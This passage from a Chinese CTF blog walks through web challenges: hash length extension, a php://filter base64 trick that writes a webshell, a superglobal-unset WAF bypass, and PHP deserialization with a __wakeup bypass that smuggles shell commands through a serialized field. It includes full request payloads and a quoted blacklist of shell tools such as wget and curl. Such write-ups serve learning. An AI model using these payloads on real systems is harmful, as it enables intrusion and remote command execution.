      <content type="html"><![CDATA[<p>最近做了几个题目，又学到新的知识点，是有关Hash长度扩展攻击<br>参考了一波P牛的博客还有我们学校的博客：<br><a href="http://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">http://www.cnblogs.com/pcat/p/5478509.html</a><br><a href="http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/" target="_blank" rel="noopener">http://www.bxsteam.xyz/2017/05/23/hash%e9%95%bf%e5%ba%a6%e6%89%a9%e5%b1%95%e6%94%bb%e5%87%bb/</a></p><a id="more"></a><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="实验吧-让我进去"><a href="#实验吧-让我进去" class="headerlink" title="实验吧 让我进去"></a>实验吧 让我进去</h2><p>既然说是admin才能进去，那我就先抓个包，看一下包里面是否又要改的东西。。。。<br>发现有一个source=0，毫不犹豫把它改为1，<br><img src="https://s1.ax1x.com/2018/05/20/CghlP1.png" alt="CghlP1.png"><br>发包获得源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Congratulations! You are a registered user.\n&quot;;</span><br><span class="line">            die (&quot;The flag is &quot;. $flag);</span><br></pre></td></tr></table></figure><p>看一下源代码发现这里有urldecode但是不会太影响，最最关键的应该是<code>md5($secret . urldecode($username . $password))</code>这个东西</p><p><img src="https://s1.ax1x.com/2018/05/20/Cgh18x.png" alt="Cgh18x.png"></p><p>关键代码就这一部分而已，其余的什么setcookie都没啥用，再看看包里面的内容，发现这个点，谷歌搜一波发现P牛的解析<br><a href="https://imgchr.com/i/Cgh8xK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cgh8xK.md.png" alt="Cgh8xK.md.png"></a><br>而后按照他的步骤安装了hashpump，最后把题目完成<br>先是新的签名，把它设置到<code>cookie</code>的<code>getmein</code>里。<br>第二个先把\x替换为%后，post提交</p><p>我最后发的包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /web/kzhan.php HTTP/1.1</span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://ctf5.shiyanbar.com/web/kzhan.php</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 227</span><br><span class="line">Cookie: sample-hash=571580b26c65f306376d4f64e53cb5c7; source=1; Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1520492842,1520518767,1520572017; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*132367%2CnickName%3A0verWatch; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1520584378; PHPSESSID=qljr4nu3o68169kr8ejb2htp87;getmein=7db18a2831cdab27425f299ca09f034e;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=admin%2580%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%25c8%2500%2500%2500%2500%2500%2500%2500abc</span><br></pre></td></tr></table></figure><h2 id="cumt平台上的一道题目"><a href="#cumt平台上的一道题目" class="headerlink" title="cumt平台上的一道题目"></a>cumt平台上的一道题目</h2><h3 id="is-hash-safe"><a href="#is-hash-safe" class="headerlink" title="is hash safe??"></a>is hash safe??</h3><p>点进去发现要admin才能看，常规操作抓包，看里面有没有要改的，果不其然，把guest改为admin发现没啥用。。。。<br><img src="https://s1.ax1x.com/2018/05/20/CghJKO.png" alt="CghJKO.png"></p><p>然后再看看页面源代码啥都没有，那应该就是源码泄露了，尝试.swp<br>发现泄露文件<br>放进kali里面用vim -r 命令复原源代码文件<br>得到源码<br><img src="https://s1.ax1x.com/2018/05/20/CghYrD.png" alt="CghYrD.png"></p><p>跟那个实验吧的题目很相似，但又有不同，实验吧那一题是有两个字符串连接符，然后使其长度为20位，发现role是guest<br>于是我们来hashpump一波，根据提示密文长度为13，并且要绕过admin字符串，于是得到<br><a href="https://imgchr.com/i/Cghtqe" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cghtqe.md.png" alt="Cghtqe.md.png"></a><br>抓包发送，得到flag<br><img src="https://s1.ax1x.com/2018/05/20/CghUVH.png" alt="CghUVH.png"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>怎么说呢，这几个题好像只考了工具怎么使用，但是一些必要的条件还是要自己找出来的，通过抓包之类的，还有一点点的代码审计，有些地方还是有些不懂，过段时间再继续完善一下自己的体会吧。。。。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>简单小结一下moctf的三道web题</title>
      <link href="/2018/03/06/moctf-web/"/>
      <url>/2018/03/06/moctf-web/</url>
      <content type="html"><![CDATA[<p>本人渣渣，于是记录一下</p><a id="more"></a><h2 id="死亡退出"><a href="#死亡退出" class="headerlink" title="死亡退出"></a>死亡退出</h2><p>一道代码审计题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  $c=<span class="string">"&lt;?php exit;?&gt;"</span>;</span><br><span class="line">  @$c.=$_POST[<span class="string">'c'</span>];</span><br><span class="line">  @$filename=$_POST[<span class="string">'file'</span>]; </span><br><span class="line">  <span class="keyword">if</span>(!<span class="keyword">isset</span>($filename))                    </span><br><span class="line">  &#123;                                       </span><br><span class="line">    file_put_contents(<span class="string">'tmp.php'</span>, <span class="string">''</span>); </span><br><span class="line">  &#125;                                 </span><br><span class="line">  @file_put_contents($filename, $c);</span><br><span class="line">  <span class="keyword">include</span>(<span class="string">'tmp.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>来看看代码，@是用来忽略错误<br>这段代码是利用最后的include执行temp.php,那么我们很快九形道运用伪协议把它给读出来。。但前提是要绕过<code>&quot;&lt;?php exit;?&gt;&quot;</code>;不然会直接退出</p><p>这里搜到一篇文章用base64绕过的一篇文章<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p>这一题我本来是想用<code>print_r(&#39;flag.php&#39;)</code>构造的，发现不行，查了查手册发现是自己理解函数有问题<br>于是参考了方方土学长的构造，我使用<code>&lt;?php system(&#39;cat flag.php&#39;);?&gt;</code><br>base64编码之后<code>PD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==</code></p><p>然后    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure><p>post参数c的时候会在<code>&lt;?php exit;?&gt;</code>后面加一些东西<br>所以会变成这个样子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;?&gt;aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure><p>然后经过base64decode之后就变成了下面的那个样子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">^?Z<span class="meta">&lt;?php</span> system(<span class="string">'cat flag.php'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意我的base64为什么前面多了个a，那是因为<br>在解码的过程中，字符<code>&lt;、?、;、&gt;、</code>空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有“<code>phpexit</code>”和我们传入的其他字符。<br>而phpexit一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。</p><p>不知道为什么，最近用bp发包都搞不了这题，我是用火狐自带Hackbar发送post数据才在控制台下面看到的flag<br>我也很是奇怪。。。。用bp抓一下包用其comparer功能对比之后发现改的包没啥差异。。。。以后还是抓包还是先过一遍hackbar吧。。emmmm</p><p>最后经过Hackbar截的包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 119.23.73.3:5003</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cache: no-cache</span><br><span class="line">origin: moz-extension://d734739a-e2f8-430e-8dc3-796d3187dbc2</span><br><span class="line">Content-Length: 126</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">c=aPD9waHAgZWNobyBmaWxlX2dldF9jb250ZW50cygiZmxhZy5waHAiKTs/Pg==&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php</span><br></pre></td></tr></table></figure><h2 id="unset"><a href="#unset" class="headerlink" title="unset"></a>unset</h2><p>这道题目也是多亏了方方土学长指导我仔细看清楚这个漏洞，最后终于明白了</p><p>这个主要是利用了Destoon 20140530最新版超全局变量覆盖导致的安全问题<br>这是网址:<a href="http://www.secevery.com:4321/bugs/wooyun-2014-063895" target="_blank" rel="noopener">http://www.secevery.com:4321/bugs/wooyun-2014-063895</a></p><p>如果 post get cookie 请求中的<code>$$key</code>和<code>$value</code>相等 就unset掉<code>$$key</code><br>如果我们向1.php?x=1提交一个POST请求 内容为<code>_GET[x]=1</code><br>因为?x=1 所以<code>$_GET</code>内容为 <code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code>,但是这里没什么关系，如果没传post参数上去的话，遍历到第一个key的时候就会符合正则继而执行exit。。。。。这个自己尝试</p><p>如果传参post上去的话，当开始遍历<code>$_POST</code>的时候 <code>$__k</code>是<code>_GET[x]</code> 所以<code>$$__k</code> 就是<code>$_GET[x]</code>也就是<code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code><br><code>$__v</code>是POST上来的一个数组 内容也是<code>array(&#39;x&#39;=&gt;&#39;1&#39;)</code><br><code>$$__k == $__v</code>成立<br>所以 ,我们的超全局变量 <code>$_GET</code>就这么华丽丽的被unset了。。。</p><p>没关系，我们的目的就是为了绕过get时候到的waf，由于我们的<code>$_GET</code>已经在前面被unset了 所以即使加了<code>EXTR_SKIP extract($_GET)</code>仍然能够正常的初始化<br><code>$_GET extract($_GET)</code>的值就成功绕过了waf的检查<br>如果单单传参post上去的话，只能实例化<code>$_POST[_GET[]]</code>,所以还得传GET参数，不然到了<code>$_GET extract($_GET)</code>就不<br>能实例化$GET了</p><p>最后我们只要利用MD5的漏洞还有php伪协议就能够把file读出来了</p><p>这是自己在本机搭建的测试源代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($a)</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>($a <span class="keyword">as</span> $key =&gt; $value)&#123;</span><br><span class="line">            <span class="keyword">echo</span> $key;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/flag/i'</span>,$key))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'are you a hacker'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_POST'</span>, <span class="string">'_GET'</span>, <span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $__R) &#123;</span><br><span class="line">        <span class="keyword">if</span>($$__R) &#123; </span><br><span class="line">        <span class="keyword">foreach</span>($$__R <span class="keyword">as</span> $__k =&gt; $__v) &#123; </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>($$__k) &amp;&amp; $$__k == $__v) <span class="keyword">unset</span>($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">    <span class="keyword">if</span>($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">    <span class="keyword">if</span>($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">    var_dump($_POST);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $_GET[<span class="string">'daiker'</span>])&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'flag'</span>] ) == md5($_GET[<span class="string">'daiker'</span>]))&#123;</span><br><span class="line">        <span class="keyword">include</span>($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：<br><img src="https://s1.ax1x.com/2018/05/20/CggZRO.png" alt="CggZRO.png"></p><h2 id="PUBG"><a href="#PUBG" class="headerlink" title="PUBG"></a>PUBG</h2><p>一打开是吃鸡的图片。。还有几个按钮，都点一下试一试，都查看一波源码<br>发现在学校的按钮下面的源码发现了index.php.bak，好家伙源码泄露<br>点开发现代码泄露</p><p>关键代码是下面这部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($pos===<span class="string">"school"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">'&lt;/br&gt;&lt;center&gt;&lt;a href="/index.html"  style="color:white"&gt;叫我校霸~~&lt;/a&gt;&lt;/center&gt;'</span>);</span><br><span class="line">            $pubg=$_GET[<span class="string">'pubg'</span>];</span><br><span class="line">            $p = unserialize($pubg);</span><br><span class="line">            <span class="comment">// $p-&gt;Get_air_drops($p-&gt;weapon,$p-&gt;bag);</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>看到unserialize函数猜想应该是反序列化的题目，同样的招式再看看那一个class.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="string">'waf.php'</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"nothing"</span>;</span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"M24"</span>;</span><br><span class="line">        <span class="comment">// public function __toString()&#123;</span></span><br><span class="line">        <span class="comment">//     $this-&gt;str="You got the airdrop";</span></span><br><span class="line">        <span class="comment">//     return $this-&gt;str;</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;bag=<span class="string">"nothing"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;weapon=<span class="string">"kar98K"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_air_drops</span><span class="params">($b)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;$b();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method,$parameters)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $file = explode(<span class="string">"."</span>,$method);</span><br><span class="line">            <span class="keyword">echo</span> $file[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span>(file_exists(<span class="string">".//class$file[0].php"</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//$method.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                system(<span class="string">"php  .//class//win.php"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">nothing</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;center&gt;You lose&lt;/center&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            waf(<span class="keyword">$this</span>-&gt;bag);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;weapon===<span class="string">'AWM'</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;Get_air_drops(<span class="keyword">$this</span>-&gt;bag);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'&lt;center&gt;The Air Drop is empty,you lose~&lt;/center&gt;'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现这段代码还有个waf.php，再来一次发现不行了，那就先构造一波吧<br>首先我们发现system函数，这里可以利用，但是在<code>__call()</code>函数里面，我们应该知道<code>__call()</code>函数应该在类里面调用一个未定义的函数的时候使用<br>这里是利用bag参数去实现这一功能，毕竟到了Get_air_drops()函数里面我们就会调用一个没定义的函数了，因为bag参数对于我们而言是可控的<br>而在调用__call函数的时候，method变量对应就是bag参数的值了。。。。</p><p>所以我们先构造类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"//win.php &amp;&amp; whoami &amp;&amp; index"</span>;    <span class="comment">//这里的index是为了闭合后面的.php</span></span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br><span class="line">       <span class="keyword">echo</span> urlencode($a);                <span class="comment">//记得URL编码上次校赛的坑现在还是记得的。。。。。</span></span><br></pre></td></tr></table></figure><p>你问我为什么bag要以win.php开头？<br>看看这里就知道了，这一句表明肯定有这样的一个文件，我直接构造就好了<br><a href="http://imgchr.com/i/9oluIP" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9oluIP.png" alt="9oluIP.png"></a></p><p>这里的$a参数出来的是下面的东西<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:2:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure></p><p>但是在反序列化的时候会自动调用<strong>wakeup()函数，从而导致了构造的类里面的变量重定义了，这就会导致失败了<br>所以我们还得绕过</strong>wakeup()函数<br>所以我们就改成这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:7:&quot;sheldon&quot;:20:&#123;s:3:&quot;bag&quot;;s:28:&quot;//win.php &amp;&amp; whoami &amp;&amp; index&quot;;s:6:&quot;weapon&quot;;s:3:&quot;AWM&quot;;&#125;</span><br></pre></td></tr></table></figure><p>urlencode之后变成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A7%3A%22sheldon%22%3A20%3A%7Bs%3A3%3A%22bag%22%3Bs%3A28%3A%22%2F%2Fwin.php+%26%26+whoami+%26%26+index%22%3Bs%3A6%3A%22weapon%22%3Bs%3A3%3A%22AWM%22%3B%7D</span><br></pre></td></tr></table></figure><p>出现了<code>Winner Winner,Chicken Dinner&lt;/center&gt;www-data</code><br>证明我们成功了，改一下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sheldon</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $bag=<span class="string">"/win.php &amp;&amp; sort waf"</span>;  </span><br><span class="line">        <span class="keyword">public</span> $weapon=<span class="string">"AWM"</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $b = <span class="keyword">new</span> sheldon();</span><br><span class="line">       $a = serialize($b);</span><br><span class="line">       <span class="keyword">echo</span> $a;</span><br></pre></td></tr></table></figure><p>出现一段代码，自己拼接一下吧<br>得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">       $black = <span class="keyword">array</span>(<span class="string">'vi'</span>,<span class="string">'awk'</span>,<span class="string">'-'</span>,<span class="string">'sed'</span>,<span class="string">'comm'</span>,<span class="string">'diff'</span>,<span class="string">'grep'</span>,<span class="string">'cp'</span>,<span class="string">'mv'</span>,<span class="string">'nl'</span>,<span class="string">'less'</span>,<span class="string">'od'</span>,<span class="string">'head'</span>,<span class="string">'tail'</span>,<span class="string">'more'</span>,<span class="string">'tac'</span>,<span class="string">'rm'</span>,<span class="string">'ls'</span>,<span class="string">'tailf'</span>,<span class="string">'%'</span>,<span class="string">'%0a'</span>,<span class="string">'%0d'</span>,<span class="string">'%00'</span>,<span class="string">'ls'</span>,<span class="string">'echo'</span>,<span class="string">'ps'</span>,<span class="string">'&gt;'</span>,<span class="string">'&lt;'</span>,<span class="string">'$&#123;IFS&#125;'</span>,<span class="string">'ifconfig'</span>,<span class="string">'mkdir'</span>,<span class="string">'cp'</span>,<span class="string">'chmod'</span>,<span class="string">'wget'</span>,<span class="string">'curl'</span>,<span class="string">'http'</span>,<span class="string">'www'</span>,<span class="string">'`'</span>,<span class="string">'printf'</span>);</span><br><span class="line">        $black = []; </span><br><span class="line">         <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($values)</span></span>&#123; </span><br><span class="line">          <span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;  <span class="keyword">if</span>(stripos($values,$value))&#123;<span class="keyword">die</span>(<span class="string">"Attack!"</span>); &#125; &#125;</span><br><span class="line"></span><br><span class="line">         &#125;</span><br></pre></td></tr></table></figure><p>发现我们可以用bash的特性绕过<br><a href="http://imgchr.com/i/9olnat" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/03/18/9olnat.png" alt="9olnat.png"></a></p><p>再改一下payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span 